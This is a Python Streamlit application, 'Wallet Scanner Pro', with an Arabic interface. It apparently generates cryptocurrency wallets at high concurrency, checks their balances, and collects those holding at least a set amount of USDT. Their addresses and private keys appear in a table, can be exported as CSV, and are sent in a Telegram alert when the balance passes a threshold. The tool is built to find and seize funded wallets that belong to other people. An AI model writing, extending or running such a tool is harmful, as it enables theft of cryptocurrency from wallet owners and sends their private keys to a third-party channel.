# main.py

import os
import time
import logging
import asyncio
import streamlit as st
import pandas as pd
from datetime import datetime
from threading import Thread
from utils.checker import WalletChecker
from utils.pricing import PriceFetcher
from utils.notifications import TelegramNotifier
from config import Config

st.set_page_config(page_title="Wallet Scanner Pro", layout="wide")

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

cfg = Config()
price_fetcher = PriceFetcher(cfg)
checker = WalletChecker(cfg, price_fetcher)
notifier = TelegramNotifier(cfg)

if "scanner_running" not in st.session_state:
    st.session_state.scanner_running = False
if "wallets_found" not in st.session_state:
    st.session_state.wallets_found = []
if "scan_start_time" not in st.session_state:
    st.session_state.scan_start_time = None
if "total_scanned" not in st.session_state:
    st.session_state.total_scanned = 0
if "notified" not in st.session_state:
    st.session_state.notified = False

# واجهة الإعدادات
with st.sidebar:
    st.header("⚙️ إعدادات الفحص")

    min_usdt = st.number_input("📉 الحد الأدنى للرصيد (USDT)", value=100.0, step=10.0)
    max_rate = st.number_input("🚀 معدل الفحص", value=20000, min_value=1, max_value=20000)
    telegram_alert = st.toggle("🔔 إرسال إشعار Telegram", value=True)
    alert_threshold = st.number_input("📢 إشعار عند رصيد >", value=1000.0, step=100.0)

    if st.button("▶️ بدء الفحص"):
        if not st.session_state.scanner_running:
            st.session_state.scanner_running = True
            st.session_state.scan_start_time = datetime.now()
            st.session_state.notified = False

            def run_scanner():
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                try:
                    results = loop.run_until_complete(checker.gen_and_check(min_usdt=min_usdt, concurrency=max_rate))
                    st.session_state.total_scanned += checker.last_batch_count

                    for w in results:
                        st.session_state.wallets_found.append(w.__dict__)
                        if telegram_alert and w.total_usdt >= alert_threshold:
                            msg = (
                                f"🎯 محفظة قوية مكتشفة!\n"
                                f"📍 الشبكة: {w.chain}\n"
                                f"💰 الرصيد: ${w.total_usdt:,.2f}\n"
                                f"🔐 المفتاح: {w.private_key}"
                            )
                            try:
                                loop.run_until_complete(notifier.send(msg))
                            except Exception as e:
                                logging.warning(f"Telegram send failed: {e}")
                except Exception as e:
                    logging.error(f"Scanner crashed: {e}")
                finally:
                    st.session_state.scanner_running = False

            Thread(target=run_scanner).start()

    if st.button("⏹️ إيقاف الفحص"):
        st.session_state.scanner_running = False

# التبويبات
tab1, tab2, tab3 = st.tabs(["📡 المراقبة", "💰 النتائج", "📈 الإحصائيات"])

with tab1:
    st.header("📊 المراقبة اللحظية")
    st.metric("📌 الحالة", "🟢 تعمل" if st.session_state.scanner_running else "🔴 متوقفة")
    st.metric("🧮 إجمالي المحافظ المفحوصة", f"{st.session_state.total_scanned:,}")
    st.metric("💎 عدد النتائج", len(st.session_state.wallets_found))
    if st.session_state.scan_start_time:
        elapsed = datetime.now() - st.session_state.scan_start_time
        st.metric("⏱️ مدة التشغيل", str(elapsed).split(".")[0])

with tab2:
    st.header("📋 المحافظ المكتشفة")
    if st.session_state.wallets_found:
        df = pd.DataFrame(st.session_state.wallets_found)
        df["الرصيد (USDT)"] = df["total_usdt"].apply(lambda x: f"${x:,.2f}")
        df["وقت الاكتشاف"] = pd.to_datetime(df["timestamp"])
        df = df.rename(columns={
            "address": "العنوان",
            "chain": "السلسلة",
            "score": "التصنيف",
            "private_key": "المفتاح الخاص"
        })
        st.dataframe(df[["العنوان", "السلسلة", "الرصيد (USDT)", "التصنيف", "المفتاح الخاص", "وقت الاكتشاف"]])
        st.download_button("⬇️ تحميل النتائج (CSV)", data=df.to_csv(index=False), file_name="wallets.csv")
    else:
        st.info("لا توجد محافظ مكتشفة بعد.")

with tab3:
    st.header("📈 إحصائيات عامة")
    if st.session_state.wallets_found:
        df = pd.DataFrame(st.session_state.wallets_found)
        st.subheader("📊 توزيع السلاسل")
        st.bar_chart(df["chain"].value_counts())
        st.subheader("💰 توزيع الأرصدة")
        st.bar_chart(df["total_usdt"])
    else:
        st.info("ابدأ الفحص لرؤية الإحصائيات.")

if st.session_state.scanner_running:
    time.sleep(3)
    st.rerun()